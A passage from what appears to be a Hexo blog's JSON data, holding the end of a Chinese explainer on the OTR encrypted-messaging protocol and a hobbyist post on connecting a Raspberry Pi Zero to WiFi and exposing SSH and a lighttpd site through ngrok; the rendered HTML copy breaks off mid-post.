并不需要去清除MK</li>\n<li>事实上，在他们发下一条消息的时候还用着之前的MK</li>\n<li>这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响</li>\n</ul>\n<p>从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为：</p>\n<ol>\n<li>Alice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方</li>\n<li>若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1</li>\n<li>M1经由服务器被发送给消息接收方</li>\n<li>Bob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M</li>\n</ol>\n<h1 id=\"Awesome-OTRs\"><a href=\"#Awesome-OTRs\" class=\"headerlink\" title=\"Awesome OTRs\"></a>Awesome OTRs</h1><p>官网: <a href=\"https://otr.cypherpunks.ca/\" target=\"_blank\" rel=\"external\">https://otr.cypherpunks.ca/</a></p>\n<p>pidgin-otr: <a href=\"https://otr.cypherpunks.ca/gentoo-install/otr-setup.html\" target=\"_blank\" rel=\"external\">https://otr.cypherpunks.ca/gentoo-install/otr-setup.html</a></p>\n<p>JavaScript 实现: <a href=\"https://github.com/arlolra/otr\" target=\"_blank\" rel=\"external\">https://github.com/arlolra/otr</a></p>\n<p>otr.to源代码(JS): <a href=\"https://github.com/OTRMan/otr.to-chat\" target=\"_blank\" rel=\"external\">https://github.com/OTRMan/otr.to-chat</a></p>\n<p>一个python的otr项目: <a href=\"https://github.com/SpiralP/HexChat-otr\" target=\"_blank\" rel=\"external\">https://github.com/SpiralP/HexChat-otr</a></p>\n<p>otrtalk(JS): <a href=\"https://github.com/mnaamani/otrtalk\" target=\"_blank\" rel=\"external\">https://github.com/mnaamani/otrtalk</a></p>\n<p>Facebook的OTR实现Chrome插件:<a href=\"https://github.com/osnr/otron\" target=\"_blank\" rel=\"external\">https://github.com/osnr/otron</a></p>\n<p>一个基于OTR技术的P2P聊天系统: <a href=\"https://github.com/mehrvarz/P2pChatOTR\" target=\"_blank\" rel=\"external\">https://github.com/mehrvarz/P2pChatOTR</a></p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽…</p>\n","excerpt":"<p>中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。</p>","more":"<p>通过OTR技术，能够实现:</p>\n<ul>\n<li>加密聊天内容</li>\n<li>证明与你聊天的人就是与你聊天的人（防止中间人攻击）</li>\n<li>服务器无法记录你的真实聊天内容</li>\n</ul>\n<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><h2 id=\"消息鉴别码-MAC\"><a href=\"#消息鉴别码-MAC\" class=\"headerlink\" title=\"消息鉴别码(MAC)\"></a>消息鉴别码(MAC)</h2><p>在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。</p>\n<p><img src=\"/content/images/otr/1.png\" alt=\"\"></p>\n<p>假设有两个聊天用户，一个叫Alice，一个叫Bob。</p>\n<p><img src=\"/content/images/otr/2.jpg\" alt=\"\"></p>\n<p>例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。</p>\n<p>其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。</p>\n<p>它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。</p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。</p>\n<ul>\n<li>Alice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g</li>\n<li>A-&gt;B: Alice 生成g^x，并且签名SignAlice(g^x)</li>\n<li>B-&gt;A: Bob 生成g^y，并且签名SignBob(g^y)</li>\n<li>SS=g^xy: 生成共享的公钥</li>\n</ul>\n<p>第二步，使用公钥加密消息，消息传递。</p>\n<ul>\n<li>计算EK=Hash(SS), MK=Hash(EK) </li>\n<li>A-&gt;B: Encek(M), MAC(Encek(M),MK)</li>\n<li>Enc采用对称加密算法，比如AES算法用EK作为密钥</li>\n<li>Bob 用MK验证MAC, 用EK解密M</li>\n<li>保密性和真实性得到了保证</li>\n</ul>\n<p>第三步，更新密钥</p>\n<ul>\n<li>Alice and Bob 再取一个x’,y’</li>\n<li>A-&gt;B: g^x’, MAC(g^x’, MK)</li>\n<li>B-&gt;A: g^y’, MAC(g^y’, MK)</li>\n<li>SS’ = H(g^x’y’)</li>\n<li>EK’ = H(SS’), MK’=H(EK’)</li>\n<li>随后，Alice和Bob安全清除掉之前的SS, x, y, EK</li>\n</ul>\n<p>第四步，继续保留 MK</p>\n<ul>\n<li>Alice 和 Bob 并不需要去清除MK</li>\n<li>事实上，在他们发下一条消息的时候还用着之前的MK</li>\n<li>这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响</li>\n</ul>\n<p>从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为：</p>\n<ol>\n<li>Alice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方</li>\n<li>若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1</li>\n<li>M1经由服务器被发送给消息接收方</li>\n<li>Bob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M</li>\n</ol>\n<h1 id=\"Awesome-OTRs\"><a href=\"#Awesome-OTRs\" class=\"headerlink\" title=\"Awesome OTRs\"></a>Awesome OTRs</h1><p>官网: <a href=\"https://otr.cypherpunks.ca/\">https://otr.cypherpunks.ca/</a></p>\n<p>pidgin-otr: <a href=\"https://otr.cypherpunks.ca/gentoo-install/otr-setup.html\">https://otr.cypherpunks.ca/gentoo-install/otr-setup.html</a></p>\n<p>JavaScript 实现: <a href=\"https://github.com/arlolra/otr\">https://github.com/arlolra/otr</a></p>\n<p>otr.to源代码(JS): <a href=\"https://github.com/OTRMan/otr.to-chat\">https://github.com/OTRMan/otr.to-chat</a></p>\n<p>一个python的otr项目: <a href=\"https://github.com/SpiralP/HexChat-otr\">https://github.com/SpiralP/HexChat-otr</a></p>\n<p>otrtalk(JS): <a href=\"https://github.com/mnaamani/otrtalk\">https://github.com/mnaamani/otrtalk</a></p>\n<p>Facebook的OTR实现Chrome插件:<a href=\"https://github.com/osnr/otron\">https://github.com/osnr/otron</a></p>\n<p>一个基于OTR技术的P2P聊天系统: <a href=\"https://github.com/mehrvarz/P2pChatOTR\">https://github.com/mehrvarz/P2pChatOTR</a></p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽…</p>"},{"title":"Raspberry Pi Zero联网奇妙记","date":"2016-12-21T23:01:26.000Z","header-img":"/content/images/zeronet/ras.jpg","_content":"\n说句实话，Zero真的不适合把玩，想让他连上网，太难了。\n\n# 痛点\n- 住公寓，有WiFi/Lan登录认证系统\n- 公寓的网络动态分配范围很大，很难快速找到树莓派的IP\n- 公寓的网络防止扫描端口，有惩罚策略\n- 没有显示器 无法查看树莓派Zero的状态\n- 树莓派Zero只有一个OTG USB接口\n- 树莓派Zero没有内置以太网Lan\n- 树莓派Zero没有无线网卡WiFi\n- 树莓派Zero没有蓝牙 更没有蓝牙局域网\n- 树莓派Zero除了核心部分 一无所有\n\n# 已有装备\n- 树莓派Zero\n- USB HUB 分线器\n- USB 以太网网卡\n- USB WIFI (芯片 8188EU)\n- 路由器\n- 网线一根\n- MacBook Pro一台\n\n# 已有环境\n- Raspbian系统\n- vncserver\n\n# 解决方案\n## 整体思路\n\n![](/content/images/zeronet/0.png)\n\n其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。\n\n![](/content/images/zeronet/1.jpg)\n\n## 去掉之前的USB网卡模式\n把sd卡取出，插入电脑\n\n在``config.txt``下删除\n```\ndtoverlay=dwc2\n```\n在``cmdline.txt``下删除\n```\nmodules-load=dwc2,g_ether\n```\n\n## 安装WiFi驱动\n\n之前遇到过很多坑，比如别的内核的WiFi驱动。\n\n首先手动下载\n\nhttps://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz\n\n检查无线适配器版本，同时传到树莓派上\n\n```bash\npi@zero:~ $ sudo ./install-wifi\n\nYour current kernel revision = 4.4.34+\nYour current kernel build    = #930\n\nChecking for a wifi module to determine the driver to install.\n\nYour wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.\n\nAnd it uses the 8188eu driver.\n\nChecking for a new 8188eu wifi driver module for your current kernel.\nThe script cannot access Dropbox to check a driver is available.\n```\n手动下载\nhttps://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz\n\n切换WiFi到树莓派网络\n```bash\nscp 8188eu-4.4.34-930.tar.gz pi@zero.local:~\n```\n在树莓派下\n```bash\ntar xzf  8188eu-4.4.34-930.tar.gz\nsudo ./install.sh\nreboot\n```\n然后检查一下 ``lsusb``(这个其实不靠谱) \n\n然后再检查一下 ``ifconfig``\n\n```bash\nwlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f\n          inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:6 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n```\n果然正确安装了。\n\n## 配置WiFi\n\n但是``wlan0     Link encap:Ethernet``被识别为了以太网，接下来我们继续解决坑。\n```bash\nsudo iwlist wlan0 scan\n```\n\n```bash\n  Cell 03 - Address: F0:B0:52:3B:7B:68\n                    ESSID:\"ASK4 Wireless\"\n                    Protocol:IEEE 802.11gn\n                    Mode:Master\n                    Frequency:2.417 GHz (Channel 2)\n                    Encryption key:off\n                    Bit Rates:144 Mb/s\n                    Quality=18/100  Signal level=70/100\n                    Extra:fm=0001\n```\n随后对``wpa_supplicant.conf``文件进行编辑，使之加入到自己的网络里。\n\n请注意，``key_mgmt=NONE``表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为``psk = \"密码\" ``\n\n```bash\nsudo vi /etc/wpa_supplicant/wpa_supplicant.conf\n```\n\n```bash\ncountry=GB\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\nnetwork={\n        ssid=\"ASK4 Wireless\"\n        key_mgmt=NONE\n\n}\n```\n编辑``/etc/network/interfaces``文件，使wlan0为动态分配获取IP。\n\n```bash\nsudo vi /etc/network/interfaces\n```\n```bash\nauto lo\niface lo inet loopback\n\niface eth0 inet dhcp\n\nauto wlan0\nallow-hotplug wlan0\niface wlan0 inet dhcp\nwpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\n\n\nallow-hotplug wlan1\niface wlan1 inet manual\n    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\n```\n\n随后重启我们wlan0\n\n```bash\nsudo ifdown wlan0\nsudo ifup wlan0\n```\n\n如果能搜索到WiFi会自动进行DHCP获取ip地址阶段\n\n```bash\nListening on LPF/wlan0/0c:82:68:12:93:8f\nSending on   LPF/wlan0/0c:82:68:12:93:8f\nSending on   Socket/fallback\nDHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8\nDHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12\nDHCPREQUEST on wlan0 to 255.255.255.255 port 67\nDHCPOFFER from 10.80.192.1\nDHCPACK from 10.80.192.1\nbound to 10.80.200.83 -- renewal in 440 seconds.\n```\n随后，用``ifconfig``命令查看一下获取的IP地址\n\n```bash\nwlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f\n          inet addr:10.80.200.83  Bcast:10.80.207.255  Mask:255.255.240.0\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:17 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:1 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:4681 (4.5 KiB)  TX bytes:18372 (17.9 KiB)\n```\n\n![](/content/images/zeronet/3.png)\n\n再对mac地址进行绑定，再进入vnc，试试看\n\n![](/content/images/zeronet/4.jpg)\n\n哇 可以上网了！\n\n然而悲痛的消息还有呢~\n\n内网隔离\n\n## ngrok TCP转发\n\n这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。\n\n下载ngrok\n```bash\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip\nunzip ngrok-stable-linux-arm.zip\n```\n配置开机启动项``vi /etc/rc.local``\n在exit 0 前面加入\n```bash\n/home/pi/ngrok authtoken 你的AUTO\n/home/pi/ngrok tcp 22\n```\n搞定！拔掉USB HUB，关掉路由器，重启！\n\n过了10分钟后，我们的树莓派上线了！\n\n![](/content/images/zeronet/5.png)\n\n用ssh命令连接一下\n\n```bash\nssh pi@0.tcp.ngrok.io -p 13016\n```\n连接速度超级快，如同本地一样，给ngrok官网点赞。\n\n![](/content/images/zeronet/6.jpg)\n\n## lighttpd 部署\n\n总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。\n\n那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。\n\n```bash\nsudo apt-get install -y lighttpd\n```\n\n安装完成！目录在``/var/www/html``\n\n写好html，部署上去。\n\n那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。\n\n``nano /home/pi/.ngrok2/ngrok.yml``\n```\nauthtoken: 你的AUTH\nregion: eu\njson_resolver_url: \"\"\ndns_resolver_ips: []\n\ntunnels:\n  app-foo:\n    addr: 80\n    proto: http\n    host_header: app-foo.dev\n  app-bar:\n    addr: 22\n    proto: tcp\n    host_header: app-bar.dev\n\n```\n这样就部署了两个服务，``app-foo``，``app-bar``，不错，开机再启动他们。\n\n```bash\nsudo nano /etc/rc.local\n```\n把之前那句换成\n```\n/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar\n```\n好了，剩下我们要做的就是重启与等待。\n\n![](/content/images/zeronet/7.jpg)\n\n哈哈，上线了，访问一下。\n\n![](/content/images/zeronet/8.png)\n\n这个只有4英镑的树莓派实现联网后花费了：\n\n树莓派：4磅\n\nOTG线：0.86磅\n\nWIFI适配器：人民币25元\n\n储存卡：9磅\n\n谢谢~~观看~~忍耐全文。","source":"_posts/Rasberry-Pi-Zero-联网奇妙记.md","raw":"---\ntitle: Raspberry Pi Zero联网奇妙记\ndate: 2016-12-21 23:01:26\ntags: Raspberry\ncategories: Rasberry\npermalink: network-zero\nheader-img: \"/content/images/zeronet/ras.jpg\"\n---\n\n说句实话，Zero真的不适合把玩，想让他连上网，太难了。\n\n# 痛点\n- 住公寓，有WiFi/Lan登录认证系统\n- 公寓的网络动态分配范围很大，很难快速找到树莓派的IP\n- 公寓的网络防止扫描端口，有惩罚策略\n- 没有显示器 无法查看树莓派Zero的状态\n- 树莓派Zero只有一个OTG USB接口\n- 树莓派Zero没有内置以太网Lan\n- 树莓派Zero没有无线网卡WiFi\n- 树莓派Zero没有蓝牙 更没有蓝牙局域网\n- 树莓派Zero除了核心部分 一无所有\n\n# 已有装备\n- 树莓派Zero\n- USB HUB 分线器\n- USB 以太网网卡\n- USB WIFI (芯片 8188EU)\n- 路由器\n- 网线一根\n- MacBook Pro一台\n\n# 已有环境\n- Raspbian系统\n- vncserver\n\n# 解决方案\n## 整体思路\n\n![](/content/images/zeronet/0.png)\n\n其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。\n\n![](/content/images/zeronet/1.jpg)\n\n## 去掉之前的USB网卡模式\n把sd卡取出，插入电脑\n\n在``config.txt``下删除\n```\ndtoverlay=dwc2\n```\n在``cmdline.txt``下删除\n```\nmodules-load=dwc2,g_ether\n```\n\n## 安装WiFi驱动\n\n之前遇到过很多坑，比如别的内核的WiFi驱动。\n\n首先手动下载\n\nhttps://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz\n\n检查无线适配器版本，同时传到树莓派上\n\n```bash\npi@zero:~ $ sudo ./install-wifi\n\nYour current kernel revision = 4.4.34+\nYour current kernel build    = #930\n\nChecking for a wifi module to determine the driver to install.\n\nYour wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.\n\nAnd it uses the 8188eu driver.\n\nChecking for a new 8188eu wifi driver module for your current kernel.\nThe script cannot access Dropbox to check a driver is available.\n```\n手动下载\nhttps://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz\n\n切换WiFi到树莓派网络\n```bash\nscp 8188eu-4.4.34-930.tar.gz pi@zero.local:~\n```\n在树莓派下\n```bash\ntar xzf  8188eu-4.4.34-930.tar.gz\nsudo ./install.sh\nreboot\n```\n然后检查一下 ``lsusb``(这个其实不靠谱) \n\n然后再检查一下 ``ifconfig``\n\n```bash\nwlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f\n          inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:6 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n```\n果然正确安装了。\n\n## 配置WiFi\n\n但是``wlan0     Link encap:Ethernet``被识别为了以太网，接下来我们继续解决坑。\n```bash\nsudo iwlist wlan0 scan\n```\n\n```bash\n  Cell 03 - Address: F0:B0:52:3B:7B:68\n                    ESSID:\"ASK4 Wireless\"\n                    Protocol:IEEE 802.11gn\n                    Mode:Master\n                    Frequency:2.417 GHz (Channel 2)\n                    Encryption key:off\n                    Bit Rates:144 Mb/s\n                    Quality=18/100  Signal level=70/100\n                    Extra:fm=0001\n```\n随后对``wpa_supplicant.conf``文件进行编辑，使之加入到自己的网络里。\n\n请注意，``key_mgmt=NONE``表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为``psk = \"密码\" ``\n\n```bash\nsudo vi /etc/wpa_supplicant/wpa_supplicant.conf\n```\n\n```bash\ncountry=GB\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\nnetwork={\n        ssid=\"ASK4 Wireless\"\n        key_mgmt=NONE\n\n}\n```\n编辑``/etc/network/interfaces``文件，使wlan0为动态分配获取IP。\n\n```bash\nsudo vi /etc/network/interfaces\n```\n```bash\nauto lo\niface lo inet loopback\n\niface eth0 inet dhcp\n\nauto wlan0\nallow-hotplug wlan0\niface wlan0 inet dhcp\nwpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\n\n\nallow-hotplug wlan1\niface wlan1 inet manual\n    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\n```\n\n随后重启我们wlan0\n\n```bash\nsudo ifdown wlan0\nsudo ifup wlan0\n```\n\n如果能搜索到WiFi会自动进行DHCP获取ip地址阶段\n\n```bash\nListening on LPF/wlan0/0c:82:68:12:93:8f\nSending on   LPF/wlan0/0c:82:68:12:93:8f\nSending on   Socket/fallback\nDHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8\nDHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12\nDHCPREQUEST on wlan0 to 255.255.255.255 port 67\nDHCPOFFER from 10.80.192.1\nDHCPACK from 10.80.192.1\nbound to 10.80.200.83 -- renewal in 440 seconds.\n```\n随后，用``ifconfig``命令查看一下获取的IP地址\n\n```bash\nwlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f\n          inet addr:10.80.200.83  Bcast:10.80.207.255  Mask:255.255.240.0\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:17 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:1 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:4681 (4.5 KiB)  TX bytes:18372 (17.9 KiB)\n```\n\n![](/content/images/zeronet/3.png)\n\n再对mac地址进行绑定，再进入vnc，试试看\n\n![](/content/images/zeronet/4.jpg)\n\n哇 可以上网了！\n\n然而悲痛的消息还有呢~\n\n内网隔离\n\n## ngrok TCP转发\n\n这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。\n\n下载ngrok\n```bash\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip\nunzip ngrok-stable-linux-arm.zip\n```\n配置开机启动项``vi /etc/rc.local``\n在exit 0 前面加入\n```bash\n/home/pi/ngrok authtoken 你的AUTO\n/home/pi/ngrok tcp 22\n```\n搞定！拔掉USB HUB，关掉路由器，重启！\n\n过了10分钟后，我们的树莓派上线了！\n\n![](/content/images/zeronet/5.png)\n\n用ssh命令连接一下\n\n```bash\nssh pi@0.tcp.ngrok.io -p 13016\n```\n连接速度超级快，如同本地一样，给ngrok官网点赞。\n\n![](/content/images/zeronet/6.jpg)\n\n## lighttpd 部署\n\n总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。\n\n那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。\n\n```bash\nsudo apt-get install -y lighttpd\n```\n\n安装完成！目录在``/var/www/html``\n\n写好html，部署上去。\n\n那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。\n\n``nano /home/pi/.ngrok2/ngrok.yml``\n```\nauthtoken: 你的AUTH\nregion: eu\njson_resolver_url: \"\"\ndns_resolver_ips: []\n\ntunnels:\n  app-foo:\n    addr: 80\n    proto: http\n    host_header: app-foo.dev\n  app-bar:\n    addr: 22\n    proto: tcp\n    host_header: app-bar.dev\n\n```\n这样就部署了两个服务，``app-foo``，``app-bar``，不错，开机再启动他们。\n\n```bash\nsudo nano /etc/rc.local\n```\n把之前那句换成\n```\n/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar\n```\n好了，剩下我们要做的就是重启与等待。\n\n![](/content/images/zeronet/7.jpg)\n\n哈哈，上线了，访问一下。\n\n![](/content/images/zeronet/8.png)\n\n这个只有4英镑的树莓派实现联网后花费了：\n\n树莓派：4磅\n\nOTG线：0.86磅\n\nWIFI适配器：人民币25元\n\n储存卡：9磅\n\n谢谢~~观看~~忍耐全文。","slug":"network-zero","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xo700145es511yerxh9","content":"<p>说句实话，Zero真的不适合把玩，想让他连上网，太难了。</p>\n<h1 id=\"痛点\"><a href=\"#痛点\" class=\"headerlink\" title=\"痛点\"></a>痛点</h1><ul>\n<li>住公寓，有WiFi/Lan登录认证系统</li>\n<li>公寓的网络动态分配范围很大，很难快速找到树莓派的IP</li>\n<li>公寓的网络防止扫描端口，有惩罚策略</li>\n<li>没有显示器 无法查看树莓派Zero的状态</li>\n<li>树莓派Zero只有一个OTG USB接口</li>\n<li>树莓派Zero没有内置以太网Lan</li>\n<li>树莓派Zero没有无线网卡WiFi</li>\n<li>树莓派Zero没有蓝牙 更没有蓝牙局域网</li>\n<li>树莓派Zero除了核心部分 一无所有</li>\n</ul>\n<h1 id=\"已有装备\"><a href=\"#已有装备\" class=\"headerlink\" title=\"已有装备\"></a>已有装备</h1><ul>\n<li>树莓派Zero</li>\n<li>USB HUB 分线器</li>\n<li>USB 以太网网卡</li>\n<li>USB WIFI (芯片 8188EU)</li>\n<li>路由器</li>\n<li>网线一根</li>\n<li>MacBook Pro一台</li>\n</ul>\n<h1 id=\"已有环境\"><a href=\"#已有环境\" class=\"headerlink\" title=\"已有环境\"></a>已有环境</h1><ul>\n<li>Raspbian系统</li>\n<li>vncserver</li>\n</ul>\n<h1 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h1><h2 id=\"整体思路\"><a href=\"#整体思路\" class=\"headerlink\" title=\"整体思路\"></a>整体思路</h2><p><img src=\"/content/images/zeronet/0.png\" alt=\"\"></p>\n<p>其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。</p>\n<p><img src=\"/content/images/zeronet/1.jpg\" alt=\"\"></p>\n<h2 id=\"去掉之前的USB网卡模式\"><a href=\"#去掉之前的USB网卡模式\" class=\"headerlink\" title=\"去掉之前的USB网卡模式\"></a>去掉之前的USB网卡模式</h2><p>把sd卡取出，插入电脑</p>\n<p>在<code>config.txt</code>下删除<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>\n<p>在<code>cmdline.txt</code>下删除<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure></p>\n<h2 id=\"安装WiFi驱动\"><a href=\"#安装WiFi驱动\" class=\"headerlink\" title=\"安装WiFi驱动\"></a>安装WiFi驱动</h2><p>之前遇到过很多坑，比如别的内核的WiFi驱动。</p>\n<p>首先手动下载</p>\n<p><a href=\"https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz\" target=\"_blank\" rel=\"external\">https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz</a></p>\n<p>检查无线适配器版本，同时传到树莓派上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">pi@zero:~ $ sudo ./install-wifi</div><div class=\"line\"></div><div class=\"line\">Your current kernel revision = 4.4.34+</div><div class=\"line\">Your current kernel build    = <span class=\"comment\">#930</span></div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> a wifi module to determine the driver to install.</div><div class=\"line\"></div><div class=\"line\">Your wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.</div><div class=\"line\"></div><div class=\"line\">And it uses the 8188eu driver.</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> a new 8188eu wifi driver module <span class=\"keyword\">for</span> your current kernel.</div><div class=\"line\">The script cannot access Dropbox to check a driver is available.</div></pre></td></tr></table></figure>\n<p>手动下载<br><a href=\"https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz\" target=\"_blank\" rel=\"external\">https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz</a></p>\n<p>切换WiFi到树莓派网络<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp 8188eu-4.4.34-930.tar.gz pi@zero.local:~</div></pre></td></tr></table></figure></p>\n<p>在树莓派下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar xzf  8188eu-4.4.34-930.tar.gz</div><div class=\"line\">sudo ./install.sh</div><div class=\"line\">reboot</div></pre></td></tr></table></figure></p>\n<p>然后检查一下 <code>lsusb</code>(这个其实不靠谱) </p>\n<p>然后再检查一下 <code>ifconfig</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class=\"line\">          inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link</div><div class=\"line\">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class=\"line\">          RX packets:0 errors:0 dropped:6 overruns:0 frame:0</div><div class=\"line\">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</div><div class=\"line\">          collisions:0 txqueuelen:1000</div><div class=\"line\">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</div></pre></td></tr></table></figure>\n<p>果然正确安装了。</p>\n<h2 id=\"配置WiFi\"><a href=\"#配置WiFi\" class=\"headerlink\" title=\"配置WiFi\"></a>配置WiFi</h2><p>但是<code>wlan0     Link encap:Ethernet</code>被识别为了以太网，接下来我们继续解决坑。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td 